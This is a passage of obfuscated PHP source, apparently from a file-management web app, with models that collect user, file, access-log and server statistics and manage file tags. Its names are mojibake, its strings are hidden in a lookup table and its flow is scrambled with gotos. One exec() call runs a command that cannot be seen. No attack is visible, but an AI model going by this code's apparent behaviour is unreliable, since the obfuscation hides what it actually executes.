$AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1936]] << 16 | $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1937]] << 11 | $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1938]] << 5 | $AÀŒÌ¯·‡[$C¶ÁÕ›ã§í[1939]] >> 1; } protected function packFields($e÷ ç”Š) { $D¨„ÆÈ¡¦ô =& $_SERVER[ì‹É]; $cŸŞ—¬…–† = $D¨„ÆÈ¡¦ô[33]; $cÏ±¥àŠ‚  = array(); foreach ($e÷ ç”Š as $aÄÅšˆƒì´) { $cŸŞ—¬…–† .= $aÄÅšˆƒì´[0]; $cÏ±¥àŠ‚ [] = $aÄÅšˆƒì´[1]; } array_unshift($cÏ±¥àŠ‚ , $cŸŞ—¬…–†); return call_user_func_array($D¨„ÆÈ¡¦ô[1940], $cÏ±¥àŠ‚ ); } protected function filterFilename($B‰µ†»Å›) { $DğÙÏ›Æ‚ =& $_SERVER[ì‹É]; return str_replace(array($DğÙÏ›Æ‚[96], $DğÙÏ›Æ‚[4], $DğÙÏ›Æ‚[173], $DğÙÏ›Æ‚[70], $DğÙÏ›Æ‚[114], $DğÙÏ›Æ‚[922], $DğÙÏ›Æ‚[925], $DğÙÏ›Æ‚[268]), $DğÙÏ›Æ‚[71], $B‰µ†»Å›); } } class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($DÇó¼„”¬Ğ) { $F¸ò‚«¾µÉ =& $_SERVER[ì‹É]; $dÓœÏÚ„ø© = array($F¸ò‚«¾µÉ[527] => array($F¸ò‚«¾µÉ[29] => $F¸ò‚«¾µÉ[1941], $F¸ò‚«¾µÉ[258] => array($F¸ò‚«¾µÉ[207], $F¸ò‚«¾µÉ[687], $F¸ò‚«¾µÉ[1942], $F¸ò‚«¾µÉ[1943])), $F¸ò‚«¾µÉ[1944] => array($F¸ò‚«¾µÉ[29] => $F¸ò‚«¾µÉ[1945], $F¸ò‚«¾µÉ[258] => array($F¸ò‚«¾µÉ[207], $F¸ò‚«¾µÉ[685], $F¸ò‚«¾µÉ[1946], $F¸ò‚«¾µÉ[1947], $F¸ò‚«¾µÉ[1948]))); if (!isset($dÓœÏÚ„ø©[$DÇó¼„”¬Ğ])) { return !1; } $this->optionType = $dÓœÏÚ„ø©[$DÇó¼„”¬Ğ][$F¸ò‚«¾µÉ[29]]; $this->field = $dÓœÏÚ„ø©[$DÇó¼„”¬Ğ][$F¸ò‚«¾µÉ[258]]; return !0; } public function listData($E¡Ä¥Á¤ÂÜ = false, $aŒšÕšè±À = "\x6d\x6f\x64\x69\146\x79\x54\151\x6d\145", $B¤³Ğ¼ÓÎå = false) { return parent::listData($E¡Ä¥Á¤ÂÜ, $aŒšÕšè±À, $B¤³Ğ¼ÓÎå); } public function trendList($F‘‘•ß–) { goto fÙĞˆğ³¾Ö; eŠ½Ùµë¶Ñ: foreach ($C·í¹­ä as $Eµ¨ÀˆÜ°) { $this->{$Cäö÷ªÜîÏ}($Eµ¨ÀˆÜ°); } return $this->listData(); goto FÔòªÙº¥Ş; E«’Çºˆ’: if (!isset($Dğæ‚’êÅ¯)) { $f¶ÙŒé¡Á‚ = $F‘‘•ß– == $FçñŠ‹œ¾•[527] ? $FçñŠ‹œ¾•[469] : $FçñŠ‹œ¾•[757]; $Dğæ‚’êÅ¯ = Model($f¶ÙŒé¡Á‚)->min($FçñŠ‹œ¾•[184]); } $Cäö÷ªÜîÏ = $FçñŠ‹œ¾•[1951] . ucfirst($F‘‘•ß–); $C·í¹­ä = $this->dateList($Dğæ‚’êÅ¯); goto eŠ½Ùµë¶Ñ; fÙĞˆğ³¾Ö: $FçñŠ‹œ¾• =& $_SERVER[ì‹É]; $fª¥ĞØÚ‘ = $this->listData(); if ($fª¥ĞØÚ‘) { $FÙƒ¼±é’é = end($fª¥ĞØÚ‘); $Eµ¨ÀˆÜ° = date($FçñŠ‹œ¾•[1949], strtotime($FçñŠ‹œ¾•[1950])); if ($FÙƒ¼±é’é[$FçñŠ‹œ¾•[207]] == $Eµ¨ÀˆÜ°) { return $fª¥ĞØÚ‘; } $Dğæ‚’êÅ¯ = strtotime($FÙƒ¼±é’é[$FçñŠ‹œ¾•[207]]); } goto E«’Çºˆ’; FÔòªÙº¥Ş: } private function dateList($Aãê„İøÊÏ) { $AÄ¿äÅµ´œ =& $_SERVER[ì‹É]; $aš‡²ñ½âò = $Aãê„İøÊÏ; $AÆî†Ü¹±Œ = strtotime($AÄ¿äÅµ´œ[1950]); $A‰ˆíâùë¯ = array(); while ($aš‡²ñ½âò <= $AÆî†Ü¹±Œ) { $A‰ˆíâùë¯[] = date($AÄ¿äÅµ´œ[1949], $aš‡²ñ½âò); $aš‡²ñ½âò = strtotime($AÄ¿äÅµ´œ[1952], $aš‡²ñ½âò); } return $A‰ˆíâùë¯; } public function _recordUser($BÑİŸ½ŸÙ = '') { goto e©‚¤¡‚İË; e¯£‘”öÁ: $f¢æ¯¸Ûª… = array($AåÒœÃ½¿[184] => array($AåÒœÃ½¿[924], $FÀø”¡ÚôÒ)); $D•±õÕ± Â = Model($AåÒœÃ½¿[469])->where($f¢æ¯¸Ûª…)->count($AåÒœÃ½¿[1351]); $f¢æ¯¸Ûª…[$AåÒœÃ½¿[184]] = array($AåÒœÃ½¿[318], array($c—‡×ö·Ûº, $FÀø”¡ÚôÒ)); goto e†áÇğ¥¯Ä; e©‚¤¡‚İË: $AåÒœÃ½¿ =& $_SERVER[ì‹É]; $c—‡×ö·Ûº = strtotime(date($AåÒœÃ½¿[1953], strtotime($BÑİŸ½ŸÙ))); $FÀø”¡ÚôÒ = strtotime(date($AåÒœÃ½¿[1954], strtotime($BÑİŸ½ŸÙ))); goto e¯£‘”öÁ; eÈåùíƒ£³: $F»¥”Ì¨Ö = array($AåÒœÃ½¿[207] => $BÑİŸ½ŸÙ, $AåÒœÃ½¿[687] => (int) $D•±õÕ± Â, $AåÒœÃ½¿[1942] => (int) $CÌâÈÈÀ‰, $AåÒœÃ½¿[1943] => (int) $DĞ—èğÖŸ); return $this->insert($F»¥”Ì¨Ö); goto AÇĞĞ‹£š©; e†áÇğ¥¯Ä: $CÌâÈÈÀ‰ = Model($AåÒœÃ½¿[469])->where($f¢æ¯¸Ûª…)->count($AåÒœÃ½¿[1351]); $f¢æ¯¸Ûª…[$AåÒœÃ½¿[29]] = $AåÒœÃ½¿[1955]; $DĞ—èğÖŸ = Model($AåÒœÃ½¿[1956])->where($f¢æ¯¸Ûª…)->count($AåÒœÃ½¿[1957]); goto eÈåùíƒ£³; AÇĞĞ‹£š©: } public function _recordStore($E˜òãİ …œ = '') { goto cõ¯ÈÃÔ«; cõ¯ÈÃÔ«: $cî¹ì‚…®Ñ =& $_SERVER[ì‹É]; $bó–Ñà­ = strtotime(date($cî¹ì‚…®Ñ[1954], strtotime($E˜òãİ …œ))); $eºÑ”›…Ê = array($cî¹ì‚…®Ñ[184] => array($cî¹ì‚…®Ñ[924], $bó–Ñà­)); goto bá£ßÎáö·; bá£ßÎáö·: $bÒËªÆŸƒ½ = Model($cî¹ì‚…®Ñ[418])->where($eºÑ”›…Ê)->sum($cî¹ì‚…®Ñ[78]); $eºÑ”›…Ê[$cî¹ì‚…®Ñ[367]] = 0; $bŸÆ¼˜±Æ¢ = Model($cî¹ì‚…®Ñ[757])->where($eºÑ”›…Ê)->sum($cî¹ì‚…®Ñ[78]); goto d†»å®ê¤é; d†»å®ê¤é: $eºÑ”›…Ê[$cî¹ì‚…®Ñ[368]] = 1; $bõè©éÀ¢ = Model($cî¹ì‚…®Ñ[757])->where($eºÑ”›…Ê)->sum($cî¹ì‚…®Ñ[78]); $eºÑ”›…Ê[$cî¹ì‚…®Ñ[368]] = 2; goto DÄ‚Á™¤‰¡; DÄ‚Á™¤‰¡: $D©¨¶ÊóË = Model($cî¹ì‚…®Ñ[757])->where($eºÑ”›…Ê)->sum($cî¹ì‚…®Ñ[78]); $F«²ÆÓ † = array($cî¹ì‚…®Ñ[207] => $E˜òãİ …œ, $cî¹ì‚…®Ñ[685] => (int) $bŸÆ¼˜±Æ¢, $cî¹ì‚…®Ñ[1946] => (int) $bÒËªÆŸƒ½, $cî¹ì‚…®Ñ[1947] => (int) $bõè©éÀ¢, $cî¹ì‚…®Ñ[1948] => (int) $D©¨¶ÊóË); return $this->insert($F«²ÆÓ †); goto BªÅŒˆ…ã; BªÅŒˆ…ã: } public function trend($Cš…Íê²™, $bõ·®Éğõ) { goto CóÔÈ³­•; B»á¿™ßëğ: if (empty($F†âˆÔÚŸ)) { $cÚÇ‹ÜÌ± = date($DÃ–Øà…—Â[1949], strtotime($DÃ–Øà…—Â[1950])); $B‡ÎÛê¯Ö¹ = array($DÃ–Øà…—Â[207] => $cÚÇ‹ÜÌ±); foreach ($d»†¿äñÄ[$Cš…Íê²™] as $Fæãñ™“ß => $C‘…¥¦Å´ø) { $B‡ÎÛê¯Ö¹[$Fæãñ™“ß] = 0; } $F†âˆÔÚŸ[] = $B‡ÎÛê¯Ö¹; } $cò·ÊŒ¬óö = array(); foreach ($F†âˆÔÚŸ as $C‘…¥¦Å´ø) { if ($Cš…Íê²™ == $DÃ–Øà…—Â[1944] && $C‘…¥¦Å´ø[$DÃ–Øà…—Â[1946]] > $C‘…¥¦Å´ø[$DÃ–Øà…—Â[685]]) { $C‘…¥¦Å´ø[$DÃ–Øà…—Â[1946]] = $C‘…¥¦Å´ø[$DÃ–Øà…—Â[685]]; } foreach ($d»†¿äñÄ[$Cš…Íê²™] as $Fæãñ™“ß => $aùŞ·×µç) { $Aè÷„Œ­“• = array($DÃ–Øà…—Â[207] => $C‘…¥¦Å´ø[$DÃ–Øà…—Â[207]], $DÃ–Øà…—Â[1248] => $aùŞ·×µç); $Aè÷„Œ­“•[$e¡‡ùÍäÏ[$Cš…Íê²™]] = isset($C‘…¥¦Å´ø[$Fæãñ™“ß]) ? $C‘…¥¦Å´ø[$Fæãñ™“ß] : 0; $cò·ÊŒ¬óö[] = $Aè÷„Œ­“•; } } goto a’ïÏ…Ä§ù; aÖ±¯Ææ¾­: if ($F†âˆÔÚŸ && $bõ·®Éğõ != $DÃ–Øà…—Â[1326]) { $DÊö¡§ÑĞ = $F†âˆÔÚŸ[0][$DÃ–Øà…—Â[207]]; $fôŒ©òŠ› = $this->validDate($bõ·®Éğõ, $DÊö¡§ÑĞ); $EÉçŒ‹¡»Œ = array(); $A¸—¨ ªœ = array_to_keyvalue($F†âˆÔÚŸ, $DÃ–Øà…—Â[207]); foreach ($fôŒ©òŠ› as $cÚÇ‹ÜÌ±) { if (isset($A¸—¨ ªœ[$cÚÇ‹ÜÌ±])) { $Aè÷„Œ­“• = $A¸—¨ ªœ[$cÚÇ‹ÜÌ±]; } else { $Aè÷„Œ­“• = end($F†âˆÔÚŸ); $Aè÷„Œ­“•[$DÃ–Øà…—Â[207]] = $cÚÇ‹ÜÌ±; if ($Cš…Íê²™ == $DÃ–Øà…—Â[527]) { $Aè÷„Œ­“•[$DÃ–Øà…—Â[1942]] = $Aè÷„Œ­“•[$DÃ–Øà…—Â[1943]] = 0; } } $EÉçŒ‹¡»Œ[] = $Aè÷„Œ­“•; } $F†âˆÔÚŸ = $EÉçŒ‹¡»Œ; } $d»†¿äñÄ = array($DÃ–Øà…—Â[527] => array($DÃ–Øà…—Â[687] => LNG($DÃ–Øà…—Â[1958]), $DÃ–Øà…—Â[1942] => LNG($DÃ–Øà…—Â[1959]), $DÃ–Øà…—Â[1943] => LNG($DÃ–Øà…—Â[1960])), $DÃ–Øà…—Â[1944] => array($DÃ–Øà…—Â[685] => LNG($DÃ–Øà…—Â[1961]), $DÃ–Øà…—Â[1946] => LNG($DÃ–Øà…—Â[1962]), $DÃ–Øà…—Â[1947] => LNG($DÃ–Øà…—Â[1963]), $DÃ–Øà…—Â[1948] => LNG($DÃ–Øà…—Â[1964]))); $e¡‡ùÍäÏ = array($DÃ–Øà…—Â[527] => $DÃ–Øà…—Â[1965], $DÃ–Øà…—Â[1944] => $DÃ–Øà…—Â[78]); goto B»á¿™ßëğ; CóÔÈ³­•: $DÃ–Øà…—Â =& $_SERVER[ì‹É]; if (!$this->init($Cš…Íê²™)) { return !1; } $F†âˆÔÚŸ = $this->trendList($Cš…Íê²™); goto aÖ±¯Ææ¾­; a’ïÏ…Ä§ù: return $cò·ÊŒ¬óö; goto f¥¯âßÍê÷; f¥¯âßÍê÷: } public function validDate($F­«åˆ¬Šï, $F²ÙÍ³˜…) { goto f“â…ù†íğ; f“â…ù†íğ: $dßòÑº¦’ =& $_SERVER[ì‹É]; $FÕÊ¯Ä£Ó = date($dßòÑº¦’[1949], strtotime($dßòÑº¦’[1950])); $cŠ…Ş¥İ‹­ = array($FÕÊ¯Ä£Ó); goto f‰ô£”ß¸; f‰ô£”ß¸: switch ($F­«åˆ¬Šï) { case $dßòÑº¦’[1333]: $aÔõŠæàİÆ = mktime(0, 0, 0, date($dßòÑº¦’[1966]), date($dßòÑº¦’[1967]) - date($dßòÑº¦’[1190]) + 7 - 7, date($dßòÑº¦’[1968])); $dáóè»×‡ = 0; do { $d›Ãá«³çß = date($dßòÑº¦’[1949], $aÔõŠæàİÆ - 3600 * 24 * 7 * $dáóè»×‡); $cŠ…Ş¥İ‹­[] = $d›Ãá«³çß; $dáóè»×‡++; } while ($F²ÙÍ³˜… < $d›Ãá«³çß); break; case $dßòÑº¦’[1331]: $dáóè»×‡ = 1; do { $AÙ‰ë¶Óğ = date($dßòÑº¦’[1969], strtotime("\x2d\40{$dáóè»×‡}\40\155\x6f\x6e\164\x68\163")); $cŠ…Ş¥İ‹­[] = $AÙ‰ë¶Óğ; $dáóè»×‡++; } while ($F²ÙÍ³˜… < $AÙ‰ë¶Óğ); break; case $dßòÑº¦’[1634]: $DÑæ£ÙÚ¦† = (int) date($dßòÑº¦’[1968], strtotime($F²ÙÍ³˜…)); $b³ğÙ…ŒæÌ = (int) date($dßòÑº¦’[1968]); if ($DÑæ£ÙÚ¦† >= $b³ğÙ…ŒæÌ) { break; } for ($DÑæ£ÙÚ¦†; $DÑæ£ÙÚ¦† < $b³ğÙ…ŒæÌ; $DÑæ£ÙÚ¦†++) { $cŠ…Ş¥İ‹­[] = $DÑæ£ÙÚ¦† . $dßòÑº¦’[1970]; } break; default: break; } if ($F²ÙÍ³˜… > end($cŠ…Ş¥İ‹­)) { array_pop($cŠ…Ş¥İ‹­); } sort($cŠ…Ş¥İ‹­); goto F¤ùê‰ßè; F¤ùê‰ßè: return $cŠ…Ş¥İ‹­; goto CÁª¹Ïˆ»; CÁª¹Ïˆ»: } public function listTable($E‚¶ÖÜÄŸƒ) { $f¯ôÑíˆÇæ = ucfirst($E‚¶ÖÜÄŸƒ); return Model($f¯ôÑíˆÇæ)->listData(); } public function option($f…‡µ—¡‹¼) { $aÅµâƒ²ÂÜ = $_SERVER[ì‹É][1971] . ucfirst($f…‡µ—¡‹¼); return $this->{$aÅµâƒ²ÂÜ}(); } private function optionUser() { goto cšºº“½êÔ; cšºº“½êÔ: $Cºì•ß¿” =& $_SERVER[ì‹É]; $Fã ‹ÛÆ­„ = Model($Cºì•ß¿”[469])->count($Cºì•ß¿”[1351]); $d£ñ„ä¬‡ = Model($Cºì•ß¿”[469])->where($Cºì•ß¿”[1972])->count($Cºì•ß¿”[1351]); goto E’ó àìÊÇ; E’ó àìÊÇ: $báéœô¶àâ = strtotime($Cºì•ß¿”[1973]); $D³×ˆ×Ğå» = array($Cºì•ß¿”[1974] => array($Cºì•ß¿”[925], $báéœô¶àâ)); $b¦´¿å÷Ø = (int) Model($Cºì•ß¿”[469])->where($D³×ˆ×Ğå»)->count($Cºì•ß¿”[1351]); goto FÙÂ£ÕíÖÇ; FÙÂ£ÕíÖÇ: if (!$b¦´¿å÷Ø) { $b¦´¿å÷Ø = 1; } $báéœô¶àâ = strtotime(date($Cºì•ß¿”[1953])); $D³×ˆ×Ğå» = array($Cºì•ß¿”[1974] => array($Cºì•ß¿”[925], $báéœô¶àâ)); goto Eóèò§Íë; Eóèò§Íë: $d¿¡™å½ = Model($Cºì•ß¿”[469])->where($D³×ˆ×Ğå»)->count($Cºì•ß¿”[1351]); return array($Cºì•ß¿”[682] => (int) $Fã ‹ÛÆ­„, $Cºì•ß¿”[1975] => (int) ($Fã ‹ÛÆ­„ - $d£ñ„ä¬‡), $Cºì•ß¿”[1976] => (int) $d£ñ„ä¬‡, $Cºì•ß¿”[1977] => (int) $d¿¡™å½, $Cºì•ß¿”[1978] => $b¦´¿å÷Ø); goto c…«À­¾ªŸ; c…«À­¾ªŸ: } private function optionFile() { goto eÅ…óšìº; bÁÁËõ…‰: $FÖŠœ×ªŸ˜ = Model($B¾Ç…¢æŒø[757])->where($d“ÊÓ—¾ó)->sum($B¾Ç…¢æŒø[78]); $dÈÕ°­„ÆÌ = Model($B¾Ç…¢æŒø[757])->where($d“ÊÓ—¾ó)->count($B¾Ç…¢æŒø[366]); return array($B¾Ç…¢æŒø[685] => $d·öª³×ë¥, $B¾Ç…¢æŒø[1946] => $Fè‰í‰áß¤, $B¾Ç…¢æŒø[1979] => $d·öª³×ë¥ - $Fè‰í‰áß¤, $B¾Ç…¢æŒø[1980] => (int) $FÖŠœ×ªŸ˜, $B¾Ç…¢æŒø[687] => (int) $A“ÑëÀøè¦, $B¾Ç…¢æŒø[1981] => (int) $dÈÕ°­„ÆÌ); goto Føæ­Œ®; Dˆ‰ø°‘‹÷: $Fè‰í‰áß¤ = $AŠĞœõ­[$B¾Ç…¢æŒø[1946]]; $A“ÑëÀøè¦ = Model($B¾Ç…¢æŒø[757])->where(array($B¾Ç…¢æŒø[367] => 0))->count($B¾Ç…¢æŒø[366]); $d“ÊÓ—¾ó = array($B¾Ç…¢æŒø[367] => 0, $B¾Ç…¢æŒø[184] => array($B¾Ç…¢æŒø[925], strtotime(date($B¾Ç…¢æŒø[1953])))); goto bÁÁËõ…‰; eÅ…óšìº: $B¾Ç…¢æŒø =& $_SERVER[ì‹É]; $AŠĞœõ­ = $this->sourceSize(); $d·öª³×ë¥ = $AŠĞœõ­[$B¾Ç…¢æŒø[78]]; goto Dˆ‰ø°‘‹÷; Føæ­Œ®: } private function optionAccess() { $C‚©³òÒİ =& $_SERVER[ì‹É]; return array($C‚©³òÒİ[682] => $this->typeLogCnt(), $C‚©³òÒİ[92] => $this->typeLogCnt($C‚©³òÒİ[92]), $C‚©³òÒİ[400] => $this->typeLogCnt($C‚©³òÒİ[400]), $C‚©³òÒİ[1982] => $this->typeLogCnt($C‚©³òÒİ[1982]), $C‚©³òÒİ[1983] => $this->typeLogCnt($C‚©³òÒİ[1983]), $C‚©³òÒİ[527] => $this->typeLogCnt($C‚©³òÒİ[33], $C‚©³òÒİ[1957])); } private function typeLogCnt($B‰¯§¢Úø = '', $F ¯³µ»•¼ = "\x69\x64") { goto Få³÷÷Ä›; aÓ´ÏÙõ÷¶: $b£–’õÂ‰¹ = array($b¨É½“¢ø[184] => array($b¨É½“¢ø[925], $D·ñô„¸¼µ)); if ($B‰¯§¢Úø) { $b£–’õÂ‰¹[$b¨É½“¢ø[29]] = array($b¨É½“¢ø[7], $eè¸‡ƒ·¢ƒ[$B‰¯§¢Úø]); } $F¬„ÜªºÏ = Model($b¨É½“¢ø[1956])->where($b£–’õÂ‰¹)->count($F ¯³µ»•¼); goto CğÜøœ¨‰†; Få³÷÷Ä›: $b¨É½“¢ø =& $_SERVER[ì‹É]; $eè¸‡ƒ·¢ƒ = array($b¨É½“¢ø[92] => array($b¨É½“¢ø[1984], $b¨É½“¢ø[1985]), $b¨É½“¢ø[400] => array($b¨É½“¢ø[1986]), $b¨É½“¢ø[1982] => array($b¨É½“¢ø[1987], $b¨É½“¢ø[1988]), $b¨É½“¢ø[1983] => array($b¨É½“¢ø[1989], $b¨É½“¢ø[1990]), $b¨É½“¢ø[1991] => array($b¨É½“¢ø[1992], $b¨É½“¢ø[1993], $b¨É½“¢ø[1994])); $D·ñô„¸¼µ = strtotime(date($b¨É½“¢ø[1953])); goto aÓ´ÏÙõ÷¶; CğÜøœ¨‰†: return (int) $F¬„ÜªºÏ; goto BØÔÀ»«ø»; BØÔÀ»«ø»: } private function optionServer() { goto cßŸù“’¿í; cßŸù“’¿í: $bè¹ñì§° =& $_SERVER[ì‹É]; $C½Õ×È¡‰Û = $this->diskDriver(); $B‡Šª¸¹óß = KodIO::defaultDriver(); goto DŸ˜®ßÅ¡; D…¨À¹¢ßì: $CŒëµ‘‡Ëä = $FŠìœá½É[0]; $fğæ¿é§ƒ¾ = $GLOBALS[$bè¹ñì§°[6]][$bè¹ñì§°[17]]; $E§ëŒŞÒÒå = $fğæ¿é§ƒ¾[$bè¹ñì§°[720]]; goto bÔˆÛ¾ˆº; cŠ¤ªÛÉ: return array($bè¹ñì§°[1997] => $C½Õ×È¡‰Û ? $C½Õ×È¡‰Û[$bè¹ñì§°[1998]] : 0, $bè¹ñì§°[1999] => $C½Õ×È¡‰Û ? $C½Õ×È¡‰Û[$bè¹ñì§°[2000]] : 0, $bè¹ñì§°[2001] => (int) $B‡Šª¸¹óß[$bè¹ñì§°[1998]] * 1024 * 1024 * 1024, $bè¹ñì§°[2002] => (int) $aöÇöïæ•¯, $bè¹ñì§°[2003] => ucfirst($CŒëµ‘‡Ëä), $bè¹ñì§°[2004] => $bè¹ñì§°[2005] . PHP_VERSION, $bè¹ñì§°[2006] => phpBuild64() ? 64 : 32, $bè¹ñì§°[681] => str_replace($bè¹ñì§°[2007], $bè¹ñì§°[901], $E§ëŒŞÒÒå), $bè¹ñì§°[334] => ucfirst($C‘ˆÊĞ«ÏÑ), $bè¹ñì§°[28] => $_SERVER[$bè¹ñì§°[2008]]); goto f¾ĞêØ—†ä; DŸ˜®ßÅ¡: $D½›ÒÙ„ù = array($bè¹ñì§°[710] => $B‡Šª¸¹óß[$bè¹ñì§°[364]]); $aöÇöïæ•¯ = Model($bè¹ñì§°[418])->where($D½›ÒÙ„ù)->sum($bè¹ñì§°[78]); $FŠìœá½É = explode($bè¹ñì§°[50], $_SERVER[$bè¹ñì§°[138]]); goto D…¨À¹¢ßì; bÔˆÛ¾ˆº: if ($E§ëŒŞÒÒå == $bè¹ñì§°[721]) { $C×Åî‘‚§ø = explode($bè¹ñì§°[722], $fğæ¿é§ƒ¾[$bè¹ñì§°[723]]); $E§ëŒŞÒÒå = $C×Åî‘‚§ø[0]; } if ($E§ëŒŞÒÒå == $bè¹ñì§°[821] || $E§ëŒŞÒÒå == $bè¹ñì§°[703]) { $B²¸‹÷œŒ§ = Model()->db()->query($bè¹ñì§°[1995]); $C£ÉˆÔÃÄ = $B²¸‹÷œŒ§[0] && isset($B²¸‹÷œŒ§[0][$bè¹ñì§°[1247]]) ? $B²¸‹÷œŒ§[0][$bè¹ñì§°[1247]] : 0; $E§ëŒŞÒÒå = $bè¹ñì§°[1996] . ($C£ÉˆÔÃÄ ? $bè¹ñì§°[8] . $C£ÉˆÔÃÄ : $bè¹ñì§°[33]); } $C‘ˆÊĞ«ÏÑ = $GLOBALS[$bè¹ñì§°[6]][$bè¹ñì§°[334]][$bè¹ñì§°[758]]; goto cŠ¤ªÛÉ; f¾ĞêØ—†ä: } private function diskDriver() { goto fó¤¥­Í…; C¼¿İŠƒä: if ($c„ˆ¤‹È½) { $Fî´ÊºÕ·¼ = $BìŒİ”Ê¡[2011]; if (function_exists($BìŒİ”Ê¡[2012])) { exec($BìŒİ”Ê¡[2013], $a²¦ñˆğ±¸); $Fî´ÊºÕ·¼ = $a²¦ñˆğ±¸[1] . $BìŒİ”Ê¡[8]; } } if (!file_exists($Fî´ÊºÕ·¼)) { return; } $d”²è–Ùğî = @disk_total_space($Fî´ÊºÕ·¼); goto dæ·¯Æâì; dæ·¯Æâì: $A‹õˆõôƒ = $d”²è–Ùğî - @disk_free_space($Fî´ÊºÕ·¼); return array($BìŒİ”Ê¡[1998] => $d”²è–Ùğî, $BìŒİ”Ê¡[2000] => $A‹õˆõôƒ); goto F‚É‡ÔÄï; fó¤¥­Í…: $BìŒİ”Ê¡ =& $_SERVER[ì‹É]; $Fî´ÊºÕ·¼ = $BìŒİ”Ê¡[8]; $c„ˆ¤‹È½ = $GLOBALS[$BìŒİ”Ê¡[6]][$BìŒİ”Ê¡[2009]] == $BìŒİ”Ê¡[2010]; goto C¼¿İŠƒä; F‚É‡ÔÄï: } public function fileChart($bÆÛ²ø¼âå) { goto D—Ì„ÜºÖ‘; D—Ì„ÜºÖ‘: $BÙ©…³îÒ‚ =& $_SERVER[ì‹É]; if (isset($bÆÛ²ø¼âå[$BÙ©…³îÒ‚[1351]])) { return Model($BÙ©…³îÒ‚[757])->userFileTypeProfile($bÆÛ²ø¼âå[$BÙ©…³îÒ‚[1351]]); } if (isset($bÆÛ²ø¼âå[$BÙ©…³îÒ‚[2014]])) { return Model($BÙ©…³îÒ‚[757])->groupFileTypeProfile($bÆÛ²ø¼âå[$BÙ©…³îÒ‚[2014]]); } goto AŞçñ¨­‹°; bŒ¼÷ŒŠÔù: $aÙ„íİãÅŒ[$BÙ©…³îÒ‚[368]] = 2; $e©Ü›åµ®† = Model($BÙ©…³îÒ‚[757])->where($aÙ„íİãÅŒ)->sum($BÙ©…³îÒ‚[78]); return array($BÙ©…³îÒ‚[685] => $Bì®Î‚¥ œ[$BÙ©…³îÒ‚[78]], $BÙ©…³îÒ‚[1946] => $Bì®Î‚¥ œ[$BÙ©…³îÒ‚[1946]], $BÙ©…³îÒ‚[1947] => (int) $C‚ÖšáóÔ«, $BÙ©…³îÒ‚[1948] => (int) $e©Ü›åµ®†); goto d‹¹…ç‹ªæ; AŞçñ¨­‹°: $Bì®Î‚¥ œ = $this->sourceSize(); $aÙ„íİãÅŒ = array($BÙ©…³îÒ‚[457] => 0, $BÙ©…³îÒ‚[368] => 1); $C‚ÖšáóÔ« = Model($BÙ©…³îÒ‚[757])->where($aÙ„íİãÅŒ)->sum($BÙ©…³îÒ‚[78]); goto bŒ¼÷ŒŠÔù; d‹¹…ç‹ªæ: } private function sourceSize() { $DàóŒğÄÖ =& $_SERVER[ì‹É]; $DÖÂ¶ÜÙÛÆ = Model($DàóŒğÄÖ[757])->where(array($DàóŒğÄÖ[367] => 0))->sum($DàóŒğÄÖ[78]); $d™œ¯×÷¥á = Model($DàóŒğÄÖ[418])->sum($DàóŒğÄÖ[78]); if ($d™œ¯×÷¥á > $DÖÂ¶ÜÙÛÆ) { $d™œ¯×÷¥á = $DÖÂ¶ÜÙÛÆ; } return array($DàóŒğÄÖ[78] => (int) $DÖÂ¶ÜÙÛÆ, $DàóŒğÄÖ[1946] => (int) $d™œ¯×÷¥á); } } goto F‰ºàÕ¥Óí; CºÇ‚Â‚ç‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\x66\x61\166"; protected function cacheFunctionAlias($cÎàÌÚéÛ˜) { $f‘‰òó¢£­ =& $_SERVER[ì‹É]; return array($f‘‰òó¢£­[2370] => array(USER_ID, $f‘‰òó¢£­[2426])); } protected function listData() { $CÙ’¡˜É”ƒ =& $_SERVER[ì‹É]; $eãéØæ“• = array($CÙ’¡˜É”ƒ[1342] => USER_ID, $CÙ’¡˜É”ƒ[432] => array($CÙ’¡˜É”ƒ[2427], 0)); $Fêİ˜‹—ù† = $CÙ’¡˜É”ƒ[2428]; $Bºå´ç›Ÿğ = $CÙ’¡˜É”ƒ[2429]; $FÛçÛÂÑÁ· = $this->field($Fêİ˜‹—ù†)->where($eãéØæ“•)->order($Bºå´ç›Ÿğ)->select(); return $FÛçÛÂÑÁ· ? $FÛçÛÂÑÁ· : array(); } protected function listByTag($Fô”’÷ ‡) { } protected function addToTag($FÄÜ¿•™ò, $c®¯­Õ÷ñ·) { $b”Úõ¾•õ =& $_SERVER[ì‹É]; if (!Model($b”Úõ¾•õ[2213])->listData($c®¯­Õ÷ñ·) || !Model($b”Úõ¾•õ[757])->pathInfo($FÄÜ¿•™ò)) { return !1; } $câèíĞÂ•¬ = array($b”Úõ¾•õ[1342] => USER_ID, $b”Úõ¾•õ[432] => $c®¯­Õ÷ñ·, $b”Úõ¾•õ[384] => $FÄÜ¿•™ò, $b”Úõ¾•õ[385] => $b”Úõ¾•õ[379], $b”Úõ¾•õ[383] => $b”Úõ¾•õ[33], $b”Úõ¾•õ[2018] => 0); if ($this->where($câèíĞÂ•¬)->find()) { return !1; } return $this->add($câèíĞÂ•¬); } protected function removeFromTag($f°ÃßÚ°İ, $CÅ• ‡µŸ†) { $c‰ñçª”æ‘ =& $_SERVER[ì‹É]; if (!Model($c‰ñçª”æ‘[2213])->listData($CÅ• ‡µŸ†) || !Model($c‰ñçª”æ‘[757])->pathInfo($f°ÃßÚ°İ)) { return !1; } $A—ˆÔ¼Ü¶¥ = array($c‰ñçª”æ‘[1342] => USER_ID, $c‰ñçª”æ‘[432] => $CÅ• ‡µŸ†, $c‰ñçª”æ‘[385] => $c‰ñçª”æ‘[379], $c‰ñçª”æ‘[384] => $f°ÃßÚ°İ); return $this->where($A—ˆÔ¼Ü¶¥)->delete(); } protected function removeByTag($F‹“ê£ï¿Ö) { $C¬ƒáÖ…Ø =& $_SERVER[ì‹É]; if (!$F‹“ê£ï¿Ö) { return !1; } $bÖò›õŒÒ = array($C¬ƒáÖ…Ø[1342] => USER_ID, $C¬ƒáÖ…Ø[432] => $F‹“ê£ï¿Ö); return $this->where($bÖò›õŒÒ)->delete(); } protected function removeBySource($dÜø™©ßÑŠ) { $d»—Æ©œÏ =& $_SERVER[ì‹É]; $BÀ™ïŠŒæ  = array($d»—Æ©œÏ[1342] => USER_ID, $d»—Æ©œÏ[384] => $dÜø™©ßÑŠ, $d»—Æ©œÏ[432] => 